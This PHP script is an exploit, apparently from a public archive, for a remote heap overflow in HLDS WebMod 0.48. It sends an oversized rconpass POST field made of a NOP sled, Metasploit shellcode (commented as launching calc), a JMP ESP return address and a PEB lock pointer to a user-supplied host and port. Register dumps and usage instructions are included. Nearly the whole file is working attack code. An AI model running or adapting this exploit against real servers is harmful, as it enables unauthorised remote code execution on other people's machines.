&lt;?php
## HLDS WebMod 0.48  (rconpass) Remote Heap Overflow Exploit
## Tested on HLDS Launcher 4.1.1.1, WebMod 0.48, Windows XP SP2 Hebrew
## shir, skod.uk [at] gmail [dot] com
## 17/12/2007

## Registers (rconpass = &quot;A&quot;x16444):
# EAX 67E04955 w_mm.67E04955
# ECX 41414141
# EDX 41414141
# EBX 0000000A
# ESP 08F650FC
# EBP 08F726D4
# ESI 08F72734
# EDI 00000000
# EIP 67E0498C w_mm.67E0498C
#########


error_reporting(7);
ini_set(&quot;max_execution_time&quot;,0);

if($_SERVER[&#039;argv&#039;][1] &amp;&amp; $_SERVER[&#039;argv&#039;][2]) {
	$host = $_SERVER[&#039;argv&#039;][1];
	$port = $_SERVER[&#039;argv&#039;][2];
} else {

	echo (&quot;\r\nHLDS WebMod 0.48 Remote Heap Overflow Exploit\r\n&quot;);
	echo (&quot;Written by shir, skod.uk\x40gmail\x2Ecom\r\n&quot;);
	echo (&quot;Usage: php {$_SERVER[&#039;argv&#039;][0]} IP PORT\r\n&quot;);
	echo (&quot;Example: php {$_SERVER[&#039;argv&#039;][0]} 192.168.0.100 27015\r\n&quot;);
	exit();
}

echo &quot;[~] Packing...\r\n&quot;;


$scode = &quot;\x66\x83\xC0\x04\xFF\xE0&quot;; /*ADD EAX, 4 =&gt; JMP EAX*/

# win32_bind - Calc executer. Metasploit.com
$shellcode =
&quot;\x33\xc9\x83\xe9\xde\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xf4&quot;.
&quot;\x47\xba\xa4\x83\xeb\xfc\xe2\xf4\x08\xaf\xfe\xa4\xf4\x47\x31\xe1&quot;.
&quot;\xc8\xcc\xc6\xa1\x8c\x46\x55\x2f\xbb\x5f\x31\xfb\xd4\x46\x51\xed&quot;.
&quot;\x7f\x73\x31\xa5\x1a\x76\x7a\x3d\x58\xc3\x7a\xd0\xf3\x86\x70\xa9&quot;.
&quot;\xf5\x85\x51\x50\xcf\x13\x9e\xa0\x81\xa2\x31\xfb\xd0\x46\x51\xc2&quot;.
&quot;\x7f\x4b\xf1\x2f\xab\x5b\xbb\x4f\x7f\x5b\x31\xa5\x1f\xce\xe6\x80&quot;.
&quot;\xf0\x84\x8b\x64\x90\xcc\xfa\x94\x71\x87\xc2\xa8\x7f\x07\xb6\x2f&quot;.
&quot;\x84\x5b\x17\x2f\x9c\x4f\x51\xad\x7f\xc7\x0a\xa4\xf4\x47\x31\xcc&quot;.
&quot;\xc8\x18\x8b\x52\x94\x11\x33\x5c\x77\x87\xc1\xf4\x9c\xb7\x30\xa0&quot;.
&quot;\xab\x2f\x22\x5a\x7e\x49\xed\x5b\x13\x24\xdb\xc8\x97\x47\xba\xa4&quot;;

$evilcode = str_repeat(&quot;\x90&quot;, 100);
$evilcode.= $shellcode;
$evilcode.= str_repeat(&quot;\x90&quot;, 16156-(strlen($shellcode)));

$evilcode.= &quot;\xFD\xAF\x6A\x07&quot;; #076AAFFD   FFE4 =&gt; JMP ESP (cstrike\dlls\mp.dll)


$evilcode.= str_repeat(&quot;\x90&quot;, 60-(strlen($scode)));
$evilcode.= $scode;
$evilcode.= str_repeat(&quot;\x90&quot;, 8);
$evilcode.= str_repeat(&quot;0&quot;, 72);
$evilcode.= str_repeat(&quot;%00&quot;, 4);
$evilcode.= str_repeat(&quot;0&quot;, 4);
$evilcode.= &quot;\x20\xF0\xFD\x7F&quot;; #Windows PEB Lock Pointer
$evilcode.= str_repeat(&quot;%00&quot;, 8);

$post = &quot;rconpass=&quot; . $evilcode . &quot;&amp;setcookiesNULL=rconpass&quot;;

$pack = &quot;POST /auth.w?redir= HTTP/1.1\r\n&quot;;
$pack.= &quot;Host: {$host}:{$port}\r\n&quot;;
$pack.= &quot;User-Agent: Mozilla/5.0\r\n&quot;;
$pack.= &quot;Accept: */*\r\n&quot;;
$pack.= &quot;Accept-Language: en-us,en;q=0.5\r\n&quot;;
$pack.= &quot;Accept-Encoding: gzip,deflate\r\n&quot;;
$pack.= &quot;Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n&quot;;
$pack.= &quot;Keep-Alive: 300\r\n&quot;;
$pack.= &quot;Connection: keep-alive\r\n&quot;;
$pack.= &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;;
$pack.= &quot;Content-Length: &quot;. strlen($post) .&quot;\r\n\r\n&quot; . $post;

echo &quot;[~] Sending...\r\n&quot;;

$sock = @fsockopen($host, $port, $errno, $errstr, 10);
	if ($errstr)
		echo(&quot;[-] Can&#039;t connect {$host}:{$port}\r\n&quot;);
	else {
			fputs($sock, $pack);
			$tmp = fgets($sock,1024);
				if(strstr($tmp, &#039;&lt;&#039;))
					echo &quot;[-] Failed, you better try again.\r\n&quot;;
				else
					echo &quot;[+] Shellcode should be executed.\r\n&quot;;
			fclose($sock);
		}
?&gt; 